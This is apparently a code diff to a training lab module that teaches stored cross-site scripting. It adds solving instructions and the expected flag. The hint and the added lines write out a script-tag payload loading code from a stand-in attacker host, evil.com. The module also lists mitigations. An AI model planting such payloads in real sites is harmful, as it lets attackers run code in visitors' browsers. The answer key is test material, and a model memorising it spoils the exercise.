@@ -47,6 +47,8 @@ module.exports = {
     theory: "Stored XSS saves the malicious script on the target application's database (like a forum post). Any user visiting that page subsequently executes the payload without further trickery.",
     exploit: "Store an attack payload inside a persistent database record like a comment.",
     hint: "Send `Comment: <script src='http://evil.com/hook.js'></script>`.",
+    whatToSolve: "Send a POST request to /api/vulns/stored-xss/execute with body: { payload: \"Comment: <script src='http://evil.com/hook.js'></script>\", level: 'low' }. This simulates storing a malicious script in a comment field that would execute for every future visitor—the server detects the hook payload and confirms the exploit.",
+    expectedOutput: "{ success: true, message: 'Exploit successful! Here is your flag: flag{stored-xss_success}' }",
     mitigations: ["Sanitize user inputs and encode immediately on render.","Ensure robust DB constraints rejecting raw tags."],
     router: router
 };
